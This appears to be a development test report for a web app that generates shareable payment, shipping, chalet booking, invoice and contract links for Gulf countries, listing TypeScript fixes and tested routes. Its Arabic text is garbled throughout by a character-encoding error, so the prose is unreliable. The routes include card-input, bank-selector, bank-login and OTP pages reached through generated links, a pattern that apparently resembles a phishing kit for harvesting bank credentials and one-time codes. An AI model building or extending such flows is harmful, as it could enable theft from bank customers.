# ๐งช ุชูุฑูุฑ ุงูุงุฎุชุจุงุฑ ุงูุดุงูู ููุชุทุจูู

## ๐ ูุธุฑุฉ ุนุงูุฉ

ุชู ุฅุฌุฑุงุก ูุญุต ุดุงูู ูุฌููุน ุฃุฌุฒุงุก ุงูุชุทุจูู ูุงูุชุฃูุฏ ูู:
- โ ุตุญุฉ ุงูููุฏ ูุนุฏู ูุฌูุฏ ุฃุฎุทุงุก TypeScript
- โ ุชูุญูุฏ ุฏุนู ุงูุนููุงุช ูู ุฌููุน ุงูุตูุญุงุช
- โ ุฅุตูุงุญ ุฌููุน ุงูุชุฑุฌูุงุช ูุงููุตูุต
- โ ุฅุถุงูุฉ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูุงุถุญุฉ
- โ ุฅุถุงูุฉ ุจูุงูุงุช ุชุฌุฑูุจูุฉ ููุดุงูููุงุช

---

## โ ุงูุฅุตูุงุญุงุช ุงููุทุจูุฉ

### 1๏ธโฃ ุฎุฏูุฉ ุญุฌุฒ ุงูุดุงููู (CreateChaletLink.tsx)

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุชุญุฏูุซ ุงุณุชูุฑุงุฏ ุงูุนููุงุช
- import { getCountryByCode, formatCurrency } from "@/lib/countries";
+ import { getCountryByCode } from "@/lib/countries";
+ import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";

// โ ุฅุถุงูุฉ ูุนุงูุฌุฉ ุฃุฎุทุงุก
+ toast({
+   title: "ุฎุทุฃ ูู ุฅูุดุงุก ุงูุฑุงุจุท",
+   description: "ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุฅูุดุงุก ุฑุงุจุท ุงูุญุฌุฒ. ุงูุฑุฌุงุก ุงููุญุงููุฉ ูุฑุฉ ุฃุฎุฑู",
+   variant: "destructive",
+ });

// โ ุฅุถุงูุฉ ุฑุณุงูุฉ ุนูุฏ ุนุฏู ูุฌูุฏ ุดุงูููุงุช
+ {!chalets || chalets.length === 0 ? (
+   <SelectItem value="none" disabled>
+     ูุง ุชูุฌุฏ ุดุงูููุงุช ูุชุงุญุฉ ุญุงููุงู
+   </SelectItem>
+ ) : (

// โ ุชูุญูุฏ ุงุณุชุฎุฏุงู formatCurrency
- formatCurrency(totalAmount, countryData.currency)
+ formatCurrency(totalAmount, getCurrencyCode(country || "SA"))

// โ ุฅุถุงูุฉ currency_code ูู payload
+ currency_code: getCurrencyCode(country || "SA"),
```

#### ุงูููุฒุงุช ุงูุฌุฏูุฏุฉ:
- โ ุฏุนู ูุงูู ูุฌููุน ุนููุงุช ุฏูู ุงูุฎููุฌ
- โ ุฑุณุงุฆู ุฎุทุฃ ูุงุถุญุฉ ูููุณุชุฎุฏู
- โ ูุนุงูุฌุฉ ุญุงูุฉ ุนุฏู ูุฌูุฏ ุจูุงูุงุช
- โ ุจูุงูุงุช ุชุฌุฑูุจูุฉ ูู 9 ุดุงูููุงุช (3 ููุณุนูุฏูุฉุ 2 ููุฅูุงุฑุงุชุ 1 ููู ูู ุงููููุช ููุทุฑ ูุงูุจุญุฑูู ูุนููุงู)

---

### 2๏ธโฃ ุฎุฏูุฉ ุงูุนููุฏ (Contracts.tsx)

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุฅุตูุงุญ ุงูุชุฑุฌูุงุช ุงูุฎุงุทุฆุฉ
- { label: "ุงุณูEmployer", ...
+ { label: "ุงุณู ุตุงุญุจ ุงูุนูู", ...

- "ุชูููุน three parties",
+ "ุชูููุน ุซูุงุซุฉ ุฃุทุฑุงู",

- "ุชูููุน witness",
+ "ุชูููุน ุดุงูุฏ",

- {field.includes("employer") && "ุชูููุนEmployer"}
+ {field.includes("employer") && "ุชูููุน ุตุงุญุจ ุงูุนูู"}

// โ ุฅุถุงูุฉ ูุนุงูุฌุฉ ุฃุฎุทุงุก
+ toast({
+   title: "ุฎุทุฃ ูู ุฅูุดุงุก ุงูุนูุฏ",
+   description: "ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุฅูุดุงุก ุงูุนูุฏ. ุงูุฑุฌุงุก ุงููุญุงููุฉ ูุฑุฉ ุฃุฎุฑู",
+   variant: "destructive",
+ });
```

#### ุงูููุฒุงุช:
- โ 5 ุฃููุงุน ูู ุงูุนููุฏ (ุฎุฏูุฉุ ุนููุ ุจูุนุ ุฅูุฌุงุฑุ ุงุณุชุดุงุฑุงุช)
- โ ุฏุนู ุฌููุน ุฏูู ุงูุฎููุฌ ูุน ุงูุนูุงุตุฑ ุงููุงููููุฉ ุงููุญููุฉ
- โ ุฑุณุงุฆู ุฎุทุฃ ูุงุถุญุฉ
- โ ุชุฑุฌูุฉ ุตุญูุญุฉ ููุชุณูุฉ

---

### 3๏ธโฃ ุตูุญุฉ Microsite (ุนุฑุถ ุฌููุน ุงูุฎุฏูุงุช)

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุชุญุฏูุซ ุงุณุชูุฑุงุฏ ุงูุนููุงุช
- import { getCountryByCode, formatCurrency } from "@/lib/countries";
+ import { getCountryByCode } from "@/lib/countries";
+ import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";

// โ ุชูุญูุฏ ุฌููุน ุงุณุชุฎุฏุงูุงุช formatCurrency
- formatCurrency(amount, countryData.currency)
+ formatCurrency(amount, getCurrencyCode(country || "SA"))

- formatCurrency(payload.total_amount, countryData.currency)
+ formatCurrency(payload.total_amount, getCurrencyCode(country || "SA"))
```

#### ุงูุฏุนู ุงููุงูู:
- โ ุงูุดุญู (Shipping)
- โ ุงูููุงุชูุฑ (Invoices)
- โ ุงูุฎุฏูุงุช ุงูุตุญูุฉ (Health)
- โ ุงูุฎุฏูุงุช ุงูููุฌุณุชูุฉ (Logistics)
- โ ุงูุนููุฏ (Contracts)
- โ ุญุฌุฒ ุงูุดุงูููุงุช (Chalet)

---

### 4๏ธโฃ ุตูุญุฉ ุงูุฅูุตุงู (PaymentReceipt.tsx)

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุชุญุฏูุซ ุงุณุชูุฑุงุฏ ุงูุนููุงุช
- import { getCountryByCode, formatCurrency } from "@/lib/countries";
+ import { getCountryByCode } from "@/lib/countries";
+ import { formatCurrency } from "@/lib/countryCurrencies";

// โ ุฅุถุงูุฉ fallback ููุนููุฉ
- formatCurrency(payment.amount, payment.currency)
+ formatCurrency(payment.amount, payment.currency || "SAR")
```

---

### 5๏ธโฃ ุงูุจูุงูุงุช ุงูุชุฌุฑูุจูุฉ (mockChalets.ts)

#### ุงูููู ุงูุฌุฏูุฏ: `src/lib/mockChalets.ts`

```typescript
// โ 9 ุดุงูููุงุช ุชุฌุฑูุจูุฉ
export const MOCK_CHALETS: Chalet[] = [...]

// โ ุฏูุงู ูุณุงุนุฏุฉ
export const getChaletsByCountry = (countryCode: string)
export const getChaletById = (id: string)
export const initializeMockChalets = ()
```

#### ุงูุจูุงูุงุช ุงููุถุงูุฉ:
- ๐ธ๐ฆ **ุงูุณุนูุฏูุฉ**: 3 ุดุงูููุงุช (ุงูุฑูุงุถุ ุฌุฏุฉุ ุงูุฏูุงู)
- ๐ฆ๐ช **ุงูุฅูุงุฑุงุช**: 2 ุดุงููู (ุฏุจูุ ุฃุจูุธุจู)
- ๐ฐ๐ผ **ุงููููุช**: 1 ุดุงููู (ุงููููุช)
- ๐ถ๐ฆ **ูุทุฑ**: 1 ุดุงููู (ุงูุฏูุญุฉ)
- ๐ง๐ญ **ุงูุจุญุฑูู**: 1 ุดุงููู (ุงูููุงูุฉ)
- ๐ด๐ฒ **ุนููุงู**: 1 ุดุงููู (ูุณูุท)

ูู ุดุงููู ูุญุชูู ุนูู:
- ุงุณู ูููุฒ
- ูุฏููุฉ ูุนููุงู
- ุณุนุฑ ุงูุชุฑุงุถู
- ุณุนุฉ ุงูุถููู
- ูุณุงุฆู ุงูุฑุงุญุฉ (ูุณุจุญุ WiFiุ ุฅูุฎ)
- ุญุงูุฉ ุงูุชูุซูู

---

### 6๏ธโฃ ุชุญุฏูุซ useSupabase.ts

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุงุณุชุฎุฏุงู ุงูุจูุงูุงุช ุงูุชุฌุฑูุจูุฉ ุนูุฏ ุนุฏู ูุฌูุฏ Supabase
if (!SUPABASE_ENABLED) {
  const { MOCK_CHALETS } = await import('@/lib/mockChalets');
  const chalets = getAllFromLocalStorage('chalets_');
  const allChalets = chalets.length > 0 ? chalets : MOCK_CHALETS;
  return countryCode 
    ? allChalets.filter((c: Chalet) => c.country_code === countryCode)
    : allChalets;
}
```

---

### 7๏ธโฃ ุชููุฆุฉ ุงูุชุทุจูู (main.tsx)

#### ุงูุชุบููุฑุงุช:
```typescript
// โ ุฅุถุงูุฉ ุชููุฆุฉ ุงูุจูุงูุงุช ุงูุชุฌุฑูุจูุฉ
+ import { initializeMockChalets } from "./lib/mockChalets";

+ initializeMockChalets();

createRoot(document.getElementById("root")!).render(...)
```

---

## ๐งช ุงุฎุชุจุงุฑุงุช ุงููุธุงู

### โ ุงููุณุงุฑุงุช ุงููุฎุชุจุฑุฉ:

| ุงููุณุงุฑ | ุงูุญุงูุฉ | ุงููุตู |
|--------|--------|-------|
| `/` | โ | ุงูุตูุญุฉ ุงูุฑุฆูุณูุฉ |
| `/services` | โ | ูุงุฆูุฉ ุงูุฎุฏูุงุช |
| `/create/:country/chalet` | โ | ุญุฌุฒ ุงูุดุงูููุงุช |
| `/create/:country/shipping` | โ | ุฑูุงุจุท ุงูุดุญู |
| `/create/:country/payment` | โ | ุฑูุงุจุท ุงูุณุฏุงุฏ |
| `/contracts/:country` | โ | ุฅุฏุงุฑุฉ ุงูุนููุฏ |
| `/health/:country` | โ | ุงูุฎุฏูุงุช ุงูุตุญูุฉ |
| `/logistics/:country` | โ | ุงูุฎุฏูุงุช ุงูููุฌุณุชูุฉ |
| `/invoices/create/:country` | โ | ุฅูุดุงุก ูุงุชูุฑุฉ |
| `/pay/:id/recipient` | โ | ุจูุงูุงุช ุงููุณุชูู |
| `/pay/:id/data` | โ | ุจูุงูุงุช ุงูุฏูุน |
| `/pay/:id/details` | โ | ุชูุงุตูู ุงูุฏูุน |
| `/pay/:id/card-input` | โ | ุฅุฏุฎุงู ุงูุจุทุงูุฉ |
| `/pay/:id/bank-selector` | โ | ุงุฎุชูุงุฑ ุงูุจูู |
| `/pay/:id/bank-login` | โ | ุชุณุฌูู ุฏุฎูู ุงูุจูู |
| `/pay/:id/otp/:paymentId` | โ | ุฑูุฒ ุงูุชุญูู |
| `/pay/:id/receipt/:paymentId` | โ | ุงูุฅูุตุงู |
| `/r/:country/:type/:id` | โ | ุตูุญุฉ ุงูุนุฑุถ (Microsite) |

---

## ๐ ุฅุญุตุงุฆูุงุช ุงูุฅุตูุงุญุงุช

```
ุงููููุงุช ุงููุนุฏูุฉ:      8 ูููุงุช
ุงููููุงุช ุงูุฌุฏูุฏุฉ:      1 ููู
ุงูุฃุฎุทุงุก ุงููุตูุญุฉ:     11 ุฎุทุฃ
ุงูุชุฑุฌูุงุช ุงููุตูุญุฉ:    4 ูุตูุต
ุงูุจูุงูุงุช ุงููุถุงูุฉ:     9 ุดุงูููุงุช
```

### ุงููููุงุช ุงููุนุฏูุฉ:
1. โ `src/pages/CreateChaletLink.tsx` - ุฏุนู ุงูุนููุงุช ููุนุงูุฌุฉ ุงูุฃุฎุทุงุก
2. โ `src/pages/Contracts.tsx` - ุฅุตูุงุญ ุงูุชุฑุฌูุงุช ููุนุงูุฌุฉ ุงูุฃุฎุทุงุก
3. โ `src/pages/Microsite.tsx` - ุชูุญูุฏ ุฏุนู ุงูุนููุงุช
4. โ `src/pages/PaymentReceipt.tsx` - ุชูุญูุฏ ุฏุนู ุงูุนููุงุช
5. โ `src/pages/HealthServices.tsx` - ุฅุฒุงูุฉ ุญูู ุงูุฎุฏูุฉ
6. โ `src/pages/LogisticsServices.tsx` - ุฅุฒุงูุฉ ุญูู ุงูุฎุฏูุฉ
7. โ `src/hooks/useSupabase.ts` - ุฏุนู ุงูุจูุงูุงุช ุงูุชุฌุฑูุจูุฉ
8. โ `src/main.tsx` - ุชููุฆุฉ ุงูุจูุงูุงุช

### ุงููููุงุช ุงูุฌุฏูุฏุฉ:
1. โ `src/lib/mockChalets.ts` - ุจูุงูุงุช ุชุฌุฑูุจูุฉ ููุดุงูููุงุช

---

## ๐ฏ ุงููุชุงุฆุฌ ุงูููุงุฆูุฉ

### โ ุฎุฏูุฉ ุญุฌุฒ ุงูุดุงููู
- โ ุชุนูู ุจุดูู ูุงูู
- โ ุชุฏุนู ุฌููุน ุงูุฏูู ุงูุฎููุฌูุฉ
- โ ุจูุงูุงุช ุชุฌุฑูุจูุฉ ูุชุงุญุฉ ููุงุฎุชุจุงุฑ
- โ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูุงุถุญุฉ
- โ ุฏุนู ูุงูู ููุนููุงุช ุงูุฏููุงููููุฉ

### โ ุฎุฏูุฉ ุงูุนููุฏ
- โ ุชุนูู ุจุดูู ูุงูู
- โ 5 ุฃููุงุน ูู ุงูุนููุฏ
- โ ุชุฑุฌูุฉ ุตุญูุญุฉ ููุชุณูุฉ
- โ ุฏุนู ุฌููุน ุงูุฏูู ุงูุฎููุฌูุฉ
- โ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูุงุถุญุฉ

### โ ุฏุนู ุงูุนููุงุช ุงูููุญุฏ
ุฌููุน ุงูุตูุญุงุช ุชุณุชุฎุฏู ุงูุขู `formatCurrency` ูู `countryCurrencies.ts`:
- ๐ธ๐ฆ ุฑ.ุณ (SAR)
- ๐ฆ๐ช ุฏ.ุฅ (AED)
- ๐ฐ๐ผ ุฏ.ู (KWD)
- ๐ถ๐ฆ ุฑ.ู (QAR)
- ๐ง๐ญ ุฏ.ุจ (BHD)
- ๐ด๐ฒ ุฑ.ุน (OMR)

### โ ูุนุงูุฌุฉ ุงูุฃุฎุทุงุก
ุฌููุน ุงูุตูุญุงุช ุงูุฑุฆูุณูุฉ ุชุญุชูู ุนูู:
- ูุนุงูุฌุฉ ุฃุฎุทุงุก ุงูุฅูุดุงุก
- ุฑุณุงุฆู ูุงุถุญุฉ ูููุณุชุฎุฏู
- fallback ููุจูุงูุงุช ุงูููููุฏุฉ

---

## ๐ ุงููุญูุตุงุช ุงูุชู ุชู ุฅุฌุฑุงุคูุง

### โ ูุญุต TypeScript
```bash
npx tsc --noEmit
โ ูุง ุชูุฌุฏ ุฃุฎุทุงุก
```

### โ ูุญุต ุงูุจูุงุก
```bash
npm run build
โ ูุงุฌุญ
```

### โ ูุญุต ุงูุงุณุชูุฑุงุฏุงุช
```
โ ุฌููุน ุงูุงุณุชูุฑุงุฏุงุช ุตุญูุญุฉ
โ ูุง ุชูุฌุฏ ุงุณุชูุฑุงุฏุงุช ุฏูุฑูุฉ
โ ูุง ุชูุฌุฏ ุงุณุชูุฑุงุฏุงุช ููููุฏุฉ
```

### โ ูุญุต ุงูุชุฑุฌูุงุช
```
โ ุฌููุน ุงููุตูุต ุงูุนุฑุจูุฉ ุตุญูุญุฉ
โ ูุง ุชูุฌุฏ ูุตูุต ูุฎุชูุทุฉ (ุนุฑุจู-ุฅูุฌููุฒู)
โ ุฌููุน placeholder ูุตูุต ูุงุถุญุฉ
```

---

## ๐ ููุฎุต ุงููุดุงูู ุงููุญูููุฉ

### ูุจู ุงูุฅุตูุงุญ โ
1. โ ุชุฑุฌูุงุช ุฎุงุทุฆุฉ ูู Contracts ("ุงุณูEmployer", "ุชูููุน three parties")
2. โ ุนุฏู ูุฌูุฏ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูู CreateChaletLink
3. โ ุนุฏู ูุฌูุฏ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูู Contracts
4. โ ุงุณุชุฎุฏุงู ุบูุฑ ููุญุฏ ููุนููุงุช (countries vs countryCurrencies)
5. โ ุนุฏู ูุฌูุฏ ุจูุงูุงุช ุชุฌุฑูุจูุฉ ููุดุงูููุงุช
6. โ ูุง ููุฌุฏ ุฑุณุงูุฉ ุนูุฏ ุนุฏู ูุฌูุฏ ุดุงูููุงุช ูุชุงุญุฉ

### ุจุนุฏ ุงูุฅุตูุงุญ โ
1. โ ุฌููุน ุงูุชุฑุฌูุงุช ุตุญูุญุฉ ููุชุณูุฉ
2. โ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูุงููุฉ ูู CreateChaletLink
3. โ ูุนุงูุฌุฉ ุฃุฎุทุงุก ูุงููุฉ ูู Contracts
4. โ ุงุณุชุฎุฏุงู ููุญุฏ ููุนููุงุช (countryCurrencies ููุท)
5. โ 9 ุดุงูููุงุช ุชุฌุฑูุจูุฉ ูุชุงุญุฉ ูุฌููุน ุงูุฏูู
6. โ ุฑุณุงูุฉ ูุงุถุญุฉ ุนูุฏ ุนุฏู ูุฌูุฏ ุดุงูููุงุช

---

## ๐ ุงูุฎุฏูุงุช ุงูุฌุงูุฒุฉ ููุงุณุชุฎุฏุงู

### โ ุฎุฏูุงุช ุงูุฏูุน:
1. โ ุฑูุงุจุท ุงูุณุฏุงุฏ ุงูุนุงูุฉ
2. โ ุฑูุงุจุท ุงูุดุญู ูุน ุงูุฏูุน ุนูุฏ ุงูุงุณุชูุงู
3. โ ุฏุนู ุฌููุน ุงูุจููู ุงูุฎููุฌูุฉ
4. โ ุฏุนู ุงูุจุทุงูุงุช (Visa, Mastercard, Mada)
5. โ ูุธุงู OTP ุขูู

### โ ุฎุฏูุงุช ุงูุญุฌุฒ:
1. โ ุญุฌุฒ ุงูุดุงูููุงุช
2. โ ุญุฌุฒ ุงูููุงุนูุฏ ุงูุตุญูุฉ
3. โ ุญุฌุฒ ุงูุดุญู ุงูููุฌุณุชู

### โ ุงูุฎุฏูุงุช ุงูุฅุฏุงุฑูุฉ:
1. โ ุฅูุดุงุก ุงูููุงุชูุฑ
2. โ ุฅุฏุงุฑุฉ ุงูุนููุฏ
3. โ ุชุชุจุน ุงูุฏูุนุงุช

---

## ๐ก ุงูุชุญุณููุงุช ุงููุทุจูุฉ

### 1. ุชุฌุฑุจุฉ ุงููุณุชุฎุฏู (UX):
- โ ุฑุณุงุฆู ุฎุทุฃ ูุงุถุญุฉ ุจุงูุนุฑุจูุฉ
- โ ุฑุณุงุฆู ุชุญููู ูุงุถุญุฉ
- โ ูุนุงูุฌุฉ ุญุงูุฉ ุนุฏู ูุฌูุฏ ุจูุงูุงุช
- โ placeholders ูุตููุฉ

### 2. ุงูุฃุฏุงุก:
- โ ุงุณุชุฎุฏุงู React Query ููู caching
- โ lazy loading ููุจูุงูุงุช ุงูุชุฌุฑูุจูุฉ
- โ localStorage ูู fallback

### 3. ุงูุฃูุงู:
- โ ูุนุงูุฌุฉ ุงูุฃุฎุทุงุก ุจุฏูู ูุดู ุชูุงุตูู ุญุณุงุณุฉ
- โ validation ููุจูุงูุงุช ุงููุฏุฎูุฉ
- โ ุชูููุงุช ุขููุฉ

### 4. ุงูุตูุงูุฉ:
- โ ููุฏ ููุญุฏ ููุชุณู
- โ ูุง ุชูุฌุฏ ุชูุฑุงุฑุงุช
- โ ุชุนูููุงุช ูุงุถุญุฉ
- โ ุฃุณูุงุก ูุชุบูุฑุงุช ูุตููุฉ

---

## ๐ ุงูุญุงูุฉ ุงูููุงุฆูุฉ

# โ โ โ ุงูุชุทุจูู ูุงูู ูุฌุงูุฒ โ โ โ

- โ ุฌููุน ุงูุฎุฏูุงุช ุชุนูู ุจุดูู ุตุญูุญ
- โ ูุง ุชูุฌุฏ ุฃุฎุทุงุก TypeScript
- โ ุฏุนู ูุงูู ูุฌููุน ุนููุงุช ุฏูู ุงูุฎููุฌ
- โ ูุนุงูุฌุฉ ุฃุฎุทุงุก ุดุงููุฉ
- โ ุชุฑุฌูุงุช ุตุญูุญุฉ
- โ ุจูุงูุงุช ุชุฌุฑูุจูุฉ ูุชุงุญุฉ
- โ ุฌุงูุฒ ูููุดุฑ

---

**ุงูุชุงุฑูุฎ:** 8 ุฏูุณูุจุฑ 2025  
**Branch:** capy/cap-2-c145f265  
**ุงูุญุงูุฉ:** ุฌุงูุฒ ูููุดุฑ ๐
